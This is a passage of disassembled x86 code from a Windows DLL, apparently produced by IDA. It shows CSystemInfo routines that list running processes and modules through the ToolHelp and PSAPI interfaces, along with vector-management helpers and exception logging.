loc_6AF4E3F2:				; CODE XREF: Ordinal1356+B1j
		lea	eax, [esi+10h]
		push	eax		; lpString
		call	ds:lstrlenA
		and	[ebp+var_360], 0
		mov	[ebp+var_364], eax
		mov	[ebp+var_35C], 1

loc_6AF4E413:				; CODE XREF: Ordinal1356+2C5j
		cmp	[ebp+var_360], 0
		jnz	short loc_6AF4E47B
		push	[ebp+var_364]	; size_t
		lea	edi, [esi+10h]
		lea	eax, [ebp+var_334]
		push	edi		; unsigned __int8 *
		push	eax		; unsigned __int8 *
		call	ds:_mbsnbicmp
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_6AF4E455
		push	[ebp+var_364]	; size_t
		lea	eax, [ebp+String2]
		push	edi		; unsigned __int8 *
		push	eax		; unsigned __int8 *
		call	ds:_mbsnbicmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4E47B

loc_6AF4E455:				; CODE XREF: Ordinal1356+117j
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		push	edi		; lpString1
		call	ds:lstrcpyA
		mov	eax, [ebp+var_338]
		mov	[esi+0Ch], eax
		mov	[ebp+var_360], 1
		jmp	loc_6AF4E5D1
; ---------------------------------------------------------------------------

loc_6AF4E47B:				; CODE XREF: Ordinal1356+F9j
					; Ordinal1356+132j
		lea	ecx, [ebp+var_130]
		call	Ordinal1329
		and	[ebp+var_4], 0
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	eax, [ebp+var_338]
		push	offset aCsysteminfoG_6 ; "CSystemInfo::GetModuleListToolHelp()"
		lea	ecx, [ebp+var_388]
		mov	[ebp+var_12C], eax
		call	Ordinal751
		lea	eax, [ebp+var_130]
		push	eax
		lea	ecx, [esi+114h]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF4DEB9
		jmp	loc_6AF4E594
; ---------------------------------------------------------------------------

loc_6AF4E4D5:				; DATA XREF: .rdata:6AF641B0o
		push	13h
		lea	ecx, [ebp+var_388]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_388]
		call	Ordinal762
		mov	ecx, [ebp+var_38C]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_388]
		call	Ordinal764
		lea	ecx, [ebp+var_388]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E58B
		retn
; ---------------------------------------------------------------------------

loc_6AF4E527:				; DATA XREF: .rdata:6AF641C0o
		push	15h
		lea	ecx, [ebp+var_388]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_388]
		call	Ordinal762
		mov	eax, [ebp+var_390]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_388]
		call	Ordinal764
		lea	ecx, [ebp+var_388]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E58B
		retn
; ---------------------------------------------------------------------------

loc_6AF4E58B:				; DATA XREF: Ordinal1356+200o
					; Ordinal1356+264o
		mov	ebx, [ebp+var_368]
		mov	esi, [ebp+arg_0]

loc_6AF4E594:				; CODE XREF: Ordinal1356+1AFj
		lea	ecx, [ebp+var_388]
		mov	[ebp+var_4], 1
		call	Ordinal753
		test	eax, eax
		lea	ecx, [ebp+var_388]
		jz	short loc_6AF4E5BE
		and	[ebp+var_35C], 0
		call	Ordinal752
		jmp	short loc_6AF4E60F
; ---------------------------------------------------------------------------

loc_6AF4E5BE:				; CODE XREF: Ordinal1356+28Dj
		call	Ordinal752
		or	[ebp+var_4], 0FFFFFFFFh
		mov	[ebp+var_130], offset off_6AF5F9E4

loc_6AF4E5D1:				; CODE XREF: Ordinal1356+155j
		lea	eax, [ebp+Dst]
		push	eax
		push	[ebp+hObject]
		call	dword ptr [ebx+0A8h]
		test	eax, eax
		jnz	loc_6AF4E413
		call	ds:GetLastError
		cmp	eax, 12h
		jz	short loc_6AF4E60F
		push	eax
		push	dword ptr [esi+4] ; Args
		push	offset aCsysteminfoG_7 ; "CSystemInfo::GetModuleListToolHelp() : "...
		call	sub_6AF3102E
		add	esp, 0Ch
		and	[ebp+var_35C], 0

loc_6AF4E60F:				; CODE XREF: Ordinal1356+29Bj
					; Ordinal1356+2D4j
		mov	esi, [ebp+var_35C]

loc_6AF4E615:				; CODE XREF: Ordinal1356+CCj
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		mov	eax, esi
		jmp	short loc_6AF4E632
; ---------------------------------------------------------------------------

loc_6AF4E625:				; CODE XREF: Ordinal1356+2Ej
					; Ordinal1356+3Bj ...
		push	offset aCsysteminfoG_8 ; "CSystemInfo::GetModuleListToolHelp() : "...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4E630:				; CODE XREF: Ordinal1356+7Aj
		xor	eax, eax

loc_6AF4E632:				; CODE XREF: Ordinal1356+302j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1356	endp ; sp-analysis failed

; Exported entry 1336.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1336
Ordinal1336	proc near		; CODE XREF: sub_6AF4E76D+Dp
					; sub_6AF4E78D+1Bp ...

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		mov	edi, ecx
		cmp	edi, esi
		jz	short loc_6AF4E695
		mov	eax, [esi+4]
		mov	[edi+4], eax
		mov	eax, [esi+8]
		mov	[edi+8], eax
		mov	eax, [esi+0Ch]
		mov	[edi+0Ch], eax
		lea	eax, [esi+10h]
		push	eax		; lpString2
		lea	eax, [edi+10h]
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	[ebp+arg_0]
		mov	eax, [esi+11Ch]
		mov	esi, [esi+118h]
		push	eax
		push	esi
		lea	ecx, [edi+114h]
		call	sub_6AF4DEF9

loc_6AF4E695:				; CODE XREF: Ordinal1336+Cj
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn	4
Ordinal1336	endp

; Exported entry 1352.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1352(DWORD hObject, int)
		public Ordinal1352
Ordinal1352	proc near		; CODE XREF: Ordinal1354+2C1p
					; Ordinal1350+14p
					; DATA XREF: ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
hObject		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		mov	ebx, [ebp+hObject]
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		lea	edi, [esi+8]
		push	edi		; int
		mov	[ebp+var_4], ecx
		push	ebx		; Args
		add	ecx, 6Ch
		mov	[esi+4], ebx
		call	Ordinal1341
		test	eax, eax
		jnz	short loc_6AF4E6D2
		push	ebx		; Args
		push	offset aCsysteminfoG_9 ; "CSystemInfo::GetProcessInfoPSAPI() : m_"...
		call	sub_6AF3102E
		and	dword ptr [edi], 0
		pop	ecx
		pop	ecx

loc_6AF4E6D2:				; CODE XREF: Ordinal1352+23j
		push	ebx		; dwProcessId
		push	0		; bInheritHandle
		push	410h		; dwDesiredAccess
		call	ds:OpenProcess
		test	eax, eax
		mov	[ebp+hObject], eax
		jnz	short loc_6AF4E700
		call	ds:GetLastError
		push	eax
		push	ebx		; Args
		push	offset aCsysteminfo_10 ; "CSystemInfo::GetProcessInfoPSAPI() : Op"...
		call	sub_6AF3102E
		add	esp, 0Ch
		xor	eax, eax
		jmp	short loc_6AF4E766
; ---------------------------------------------------------------------------

loc_6AF4E700:				; CODE XREF: Ordinal1352+48j
		mov	ecx, [ebp+var_4]
		lea	eax, [esi+114h]
		push	eax
		push	[ebp+hObject]
		mov	[ebp+arg_4], 1
		mov	[ebp+var_8], eax
		call	Ordinal1353
		test	eax, eax
		jnz	short loc_6AF4E733
		push	ebx		; Args
		push	offset aCsysteminfo_11 ; "CSystemInfo::GetProcessInfoPSAPI() : Ge"...
		call	sub_6AF3102E
		and	[ebp+arg_4], 0
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4E75A
; ---------------------------------------------------------------------------

loc_6AF4E733:				; CODE XREF: Ordinal1352+81j
		mov	edi, [esi+118h]
		lea	eax, [edi+8]
		push	eax		; lpString2
		lea	eax, [esi+10h]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	eax, [edi+4]
		mov	ecx, [ebp+var_8]
		mov	[esi+0Ch], eax
		push	edi
		lea	eax, [ebp+var_8]
		push	eax
		call	sub_6AF4D8F2

loc_6AF4E75A:				; CODE XREF: Ordinal1352+94j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		mov	eax, [ebp+arg_4]

loc_6AF4E766:				; CODE XREF: Ordinal1352+61j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1352	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4E76D	proc near		; CODE XREF: sub_6AF4E8B4+1DFp
					; sub_6AF4E8B4+243p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF4E785
; ---------------------------------------------------------------------------

loc_6AF4E774:				; CODE XREF: sub_6AF4E76D+1Cj
		push	[esp+4+arg_8]
		mov	ecx, esi
		call	Ordinal1336
		add	esi, 124h

loc_6AF4E785:				; CODE XREF: sub_6AF4E76D+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF4E774
		pop	esi
		retn
sub_6AF4E76D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E78D	proc near		; CODE XREF: sub_6AF4E7E0+10p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, [ebp+arg_4]
		cmp	[ebp+arg_0], edi
		jz	short loc_6AF4E7B3
		push	esi
		mov	esi, 124h

loc_6AF4E79F:				; CODE XREF: sub_6AF4E78D+23j
		sub	[ebp+arg_8], esi
		mov	ecx, [ebp+arg_8]
		sub	edi, esi
		push	edi
		call	Ordinal1336
		cmp	edi, [ebp+arg_0]
		jnz	short loc_6AF4E79F
		pop	esi

loc_6AF4E7B3:				; CODE XREF: sub_6AF4E78D+Aj
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	ebp
		retn
sub_6AF4E78D	endp

; Exported entry 1335.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1335
Ordinal1335	proc near		; CODE XREF: sub_6AF4E7FA+1Cp
					; sub_6AF4E82C+17p ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		push	0
		lea	ecx, [esi+114h]
		mov	dword ptr [esi], offset	off_6AF5FB70
		call	sub_6AF4D61F
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal1336
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1335	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E7E0	proc near		; CODE XREF: sub_6AF4E8B4+233p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4E78D
		add	esp, 10h
		leave
		retn
sub_6AF4E7E0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E7FA	proc near		; CODE XREF: sub_6AF4E855+13p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, [ebp+arg_0]
		cmp	edi, [ebp+arg_4]
		jz	short loc_6AF4E826
		push	esi
		mov	esi, 124h

loc_6AF4E80C:				; CODE XREF: sub_6AF4E7FA+29j
		cmp	[ebp+arg_8], 0
		jz	short loc_6AF4E81B
		mov	ecx, [ebp+arg_8]
		push	edi
		call	Ordinal1335

loc_6AF4E81B:				; CODE XREF: sub_6AF4E7FA+16j
		add	[ebp+arg_8], esi
		add	edi, esi
		cmp	edi, [ebp+arg_4]
		jnz	short loc_6AF4E80C
		pop	esi

loc_6AF4E826:				; CODE XREF: sub_6AF4E7FA+Aj
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	ebp
		retn
sub_6AF4E7FA	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E82C	proc near		; CODE XREF: sub_6AF4E872+13p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_4]
		test	esi, esi
		jbe	short loc_6AF4E852

loc_6AF4E837:				; CODE XREF: sub_6AF4E82C+24j
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF4E848
		push	[ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		call	Ordinal1335

loc_6AF4E848:				; CODE XREF: sub_6AF4E82C+Fj
		add	[ebp+arg_0], 124h
		dec	esi
		jnz	short loc_6AF4E837

loc_6AF4E852:				; CODE XREF: sub_6AF4E82C+9j
		pop	esi
		pop	ebp
		retn
sub_6AF4E82C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E855	proc near		; CODE XREF: sub_6AF4E8B4+C6p
					; sub_6AF4E8B4+F8p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4E7FA
		add	esp, 14h
		leave
		retn
sub_6AF4E855	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E872	proc near		; CODE XREF: sub_6AF4E88F+Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4E82C
		add	esp, 14h
		leave
		retn
sub_6AF4E872	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E88F	proc near		; CODE XREF: sub_6AF4E8B4+DFp
					; sub_6AF4E8B4+1C7p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4E872
		mov	eax, [ebp+arg_4]
		imul	eax, 124h
		add	esp, 10h
		add	eax, [ebp+arg_0]
		pop	ebp
		retn	0Ch
sub_6AF4E88F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4E8B4	proc near		; CODE XREF: sub_6AF4EB23+2Ep

var_144		= dword	ptr -144h
var_140		= dword	ptr -140h
var_13C		= dword	ptr -13Ch
var_138		= byte ptr -138h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_115	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 138h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+arg_8]
		mov	esi, ecx
		lea	ecx, [ebp+var_138]
		mov	[ebp+var_14], eax
		mov	[ebp+var_144], esi
		call	Ordinal1335
		and	[ebp+var_4], 0
		mov	ecx, esi
		call	sub_6AF4D424
		mov	edi, [ebp+arg_4]
		test	edi, edi
		mov	ebx, eax
		jz	loc_6AF4EAFF
		mov	ecx, esi
		call	sub_6AF4D3DC
		mov	ecx, 0E07038h
		sub	ecx, eax
		cmp	ecx, edi
		mov	ecx, esi
		jnb	short loc_6AF4E919
		call	sub_6AF4D43C
; ---------------------------------------------------------------------------

loc_6AF4E919:				; CODE XREF: sub_6AF4E8B4+5Ej
		call	sub_6AF4D3DC
		add	eax, edi
		cmp	ebx, eax
		jnb	loc_6AF4EA25
		mov	eax, ebx
		shr	eax, 1
		mov	ecx, 0E07038h
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF4E93B
		xor	ebx, ebx
		jmp	short loc_6AF4E93D
; ---------------------------------------------------------------------------

loc_6AF4E93B:				; CODE XREF: sub_6AF4E8B4+81j
		add	ebx, eax

loc_6AF4E93D:				; CODE XREF: sub_6AF4E8B4+85j
		mov	ecx, esi
		call	sub_6AF4D3DC
		add	eax, edi
		cmp	ebx, eax
		jnb	short loc_6AF4E955
		mov	ecx, esi
		call	sub_6AF4D3DC
		mov	ebx, eax
		add	ebx, edi

loc_6AF4E955:				; CODE XREF: sub_6AF4E8B4+94j
		imul	ebx, 124h
		push	ebx		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, [esi+4]
		push	esi
		push	eax
		push	[ebp+arg_0]
		mov	[ebp+var_140], eax
		push	ecx
		mov	[ebp+var_13C], eax
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF4E855
		add	esp, 14h
		lea	ecx, [ebp+var_138]
		push	ecx
		push	edi
		push	eax
		mov	ecx, esi
		mov	[ebp+var_13C], eax
		call	sub_6AF4E88F
		mov	[ebp+var_13C], eax
		mov	eax, [esi+8]
		push	esi
		push	[ebp+var_13C]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF4E855
		and	[ebp+var_4], 0
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF4D3DC
		add	edi, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4E9DD
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF4D7D6
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF4E9DD:				; CODE XREF: sub_6AF4E8B4+112j
		mov	eax, [ebp+var_140]
		imul	edi, 124h
		add	ebx, eax
		add	edi, eax
		mov	[esi+0Ch], ebx
		mov	[esi+8], edi
		mov	[esi+4], eax
		jmp	loc_6AF4EAFF
; ---------------------------------------------------------------------------

loc_6AF4E9FB:				; DATA XREF: .rdata:6AF64228o
		push	[ebp+var_144]
		push	[ebp+var_13C]
		push	[ebp+var_140]
		call	sub_6AF4D7D6
		push	[ebp+var_140]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		jmp	loc_6AF4EAC1
; ---------------------------------------------------------------------------

loc_6AF4EA25:				; CODE XREF: sub_6AF4E8B4+6Ej
		mov	ecx, [esi+8]
		mov	eax, ecx
		sub	eax, [ebp+arg_0]
		mov	ebx, 124h
		cdq
		idiv	ebx
		mov	[ebp+arg_8], ecx
		push	esi
		cmp	eax, edi
		jnb	loc_6AF4EACA
		mov	eax, [ebp+arg_0]
		mov	ebx, edi
		imul	ebx, 124h
		lea	edx, [ebx+eax]
		push	edx
		push	ecx
		push	eax
		call	sub_6AF4E855
		mov	eax, [esi+8]
		sub	eax, [ebp+arg_0]
		add	esp, 10h
		lea	ecx, [ebp+var_138]
		push	ecx
		cdq
		mov	ecx, 124h
		idiv	ecx
		mov	ecx, esi
		mov	byte ptr [ebp+var_4], 3
		sub	edi, eax
		push	edi
		push	dword ptr [esi+8]
		call	sub_6AF4E88F
		add	[esi+8], ebx
		mov	esi, [esi+8]
		lea	eax, [ebp+var_138]
		push	eax
		sub	esi, ebx
		push	esi
		push	[ebp+arg_0]
		call	sub_6AF4E76D
		add	esp, 0Ch
		jmp	short loc_6AF4EAFF
; ---------------------------------------------------------------------------

loc_6AF4EA9D:				; DATA XREF: .rdata:6AF64238o
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+var_144]
		imul	eax, 124h
		push	ecx
		mov	ecx, [ecx+8]
		add	ecx, eax
		push	ecx
		mov	ecx, [ebp+arg_0]
		add	eax, ecx
		push	eax
		call	sub_6AF4D7D6
		add	esp, 0Ch

loc_6AF4EAC1:				; CODE XREF: sub_6AF4E8B4+16Cj
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4EACA:				; CODE XREF: sub_6AF4E8B4+187j
		imul	edi, 124h
		push	ecx
		mov	ebx, ecx
		push	ecx
		sub	ebx, edi
		push	ebx
		call	sub_6AF4E855
		push	[ebp+arg_8]
		mov	[esi+8], eax
		mov	esi, [ebp+arg_0]
		push	ebx
		push	esi
		call	sub_6AF4E7E0
		lea	eax, [ebp+var_138]
		push	eax
		add	edi, esi
		push	edi
		push	esi
		call	sub_6AF4E76D
		add	esp, 28h

loc_6AF4EAFF:				; CODE XREF: sub_6AF4E8B4+46j
					; sub_6AF4E8B4+142j ...
		lea	ecx, [ebp+var_138]
		call	Ordinal1334
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
sub_6AF4E8B4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4EB23	proc near		; CODE XREF: sub_6AF4EB6A+35p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		call	sub_6AF4D3DC
		test	eax, eax
		jnz	short loc_6AF4EB34
		xor	esi, esi
		jmp	short loc_6AF4EB45
; ---------------------------------------------------------------------------

loc_6AF4EB34:				; CODE XREF: sub_6AF4EB23+Bj
		mov	eax, [esp+8+arg_4]
		sub	eax, [edi+4]
		mov	ecx, 124h
		cdq
		idiv	ecx
		mov	esi, eax

loc_6AF4EB45:				; CODE XREF: sub_6AF4EB23+Fj
		push	[esp+8+arg_8]
		mov	ecx, edi
		push	1
		push	[esp+10h+arg_4]
		call	sub_6AF4E8B4
		imul	esi, 124h
		add	esi, [edi+4]
		mov	eax, [esp+8+arg_0]
		pop	edi
		mov	[eax], esi
		pop	esi
		retn	0Ch
sub_6AF4EB23	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4EB6A	proc near		; CODE XREF: Ordinal1354+2E7p
					; Ordinal1357+18Bp

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		call	sub_6AF4D3DC
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF4D424
		cmp	edi, eax
		push	[ebp+arg_0]
		mov	ecx, esi
		jnb	short loc_6AF4EB97
		push	1
		push	dword ptr [esi+8]
		call	sub_6AF4E88F
		mov	[esi+8], eax
		jmp	short loc_6AF4EBA4
; ---------------------------------------------------------------------------

loc_6AF4EB97:				; CODE XREF: sub_6AF4EB6A+1Cj
		mov	eax, [esi+8]
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		call	sub_6AF4EB23

loc_6AF4EBA4:				; CODE XREF: sub_6AF4EB6A+2Bj
		pop	edi
		pop	esi
		pop	ebp
		retn	4
sub_6AF4EB6A	endp

; Exported entry 1354.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1354
Ordinal1354	proc near		; CODE XREF: Ordinal1351+14p
					; DATA XREF: .rdata:off_6AF66098o

var_1B8		= dword	ptr -1B8h
var_1AC		= byte ptr -1ACh
var_18C		= byte ptr -18Ch
var_16C		= dword	ptr -16Ch
var_168		= dword	ptr -168h
var_164		= dword	ptr -164h
var_160		= dword	ptr -160h
var_15C		= dword	ptr -15Ch
var_158		= dword	ptr -158h
var_154		= dword	ptr -154h
var_150		= dword	ptr -150h
Dst		= dword	ptr -14Ch
var_148		= dword	ptr -148h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_116	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 1ACh
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		xor	ebx, ebx
		cmp	[ecx+1Ch], ebx
		push	edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_160], ecx
		jnz	short loc_6AF4EBE7
		push	offset aCsysteminfo_12 ; "CSystemInfo::GetProcessListPSAPI() : m_"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF4EF9F
; ---------------------------------------------------------------------------

loc_6AF4EBE7:				; CODE XREF: Ordinal1354+29j
		mov	esi, 100h
		mov	[ebp+var_154], 1
		mov	[ebp+var_150], ebx
		mov	[ebp+var_15C], esi
		mov	[ebp+var_158], ebx
		mov	[ebp+Dst], ebx

loc_6AF4EC0E:				; CODE XREF: Ordinal1354+252j
		cmp	[ebp+var_150], esi
		jnb	loc_6AF4EE01
		push	offset aCsysteminfo_13 ; "CSystemInfo::GetProcessListPSAPI()"
		lea	ecx, [ebp+var_18C]
		mov	[ebp+var_150], esi
		call	Ordinal751
		cmp	[ebp+Dst], ebx
		mov	[ebp+var_4], ebx
		mov	byte ptr [ebp+var_4], 1
		jz	short loc_6AF4EC51
		push	[ebp+Dst]	; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx
		mov	[ebp+Dst], ebx

loc_6AF4EC51:				; CODE XREF: Ordinal1354+93j
		mov	edi, esi
		shl	edi, 2
		push	edi		; unsigned int
		call	j_??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+Dst], eax
		jnz	short loc_6AF4EC9F
		lea	eax, [ebp+var_164]
		push	eax
		lea	ecx, [ebp+var_1B8]
		mov	[ebp+var_164], offset aBadAllocation ; "bad allocation"
		call	ds:??0exception@@QAE@ABQBD@Z ; exception::exception(char const * const &)
		push	offset dword_6AF63790
		lea	eax, [ebp+var_1B8]
		push	eax
		mov	[ebp+var_1B8], offset off_6AF5CAB8
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4EC9F:				; CODE XREF: Ordinal1354+BBj
		push	edi		; Size
		push	ebx		; Val
		push	[ebp+Dst]	; Dst
		call	memset
		add	esp, 0Ch
		jmp	loc_6AF4ED72
; ---------------------------------------------------------------------------

loc_6AF4ECB4:				; DATA XREF: .rdata:6AF642C4o
		push	13h
		lea	ecx, [ebp+var_18C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_18C]
		call	Ordinal762
		mov	ecx, [ebp+var_16C]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_18C]
		call	Ordinal764
		lea	ecx, [ebp+var_18C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4ED6A
		retn
; ---------------------------------------------------------------------------

loc_6AF4ED06:				; DATA XREF: .rdata:6AF642D4o
		push	15h
		lea	ecx, [ebp+var_18C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_18C]
		call	Ordinal762
		mov	eax, [ebp+var_168]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_18C]
		call	Ordinal764
		lea	ecx, [ebp+var_18C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4ED6A
		retn
; ---------------------------------------------------------------------------

loc_6AF4ED6A:				; DATA XREF: Ordinal1354+156o
					; Ordinal1354+1BAo
		mov	esi, [ebp+var_15C]
		xor	ebx, ebx

loc_6AF4ED72:				; CODE XREF: Ordinal1354+105j
		lea	ecx, [ebp+var_18C]
		mov	[ebp+var_4], ebx
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4EDBD
		lea	ecx, [ebp+var_158]
		mov	eax, esi
		shl	eax, 2
		push	ecx
		push	eax
		push	[ebp+Dst]
		mov	eax, [ebp+var_160]
		mov	[ebp+var_158], ebx
		call	dword ptr [eax+1Ch]
		test	eax, eax
		jnz	short loc_6AF4EDCE
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsysteminfo_14 ; "CSystemInfo::GetProcessListPSAPI() : m_"...
		call	sub_6AF3102E
		pop	ecx
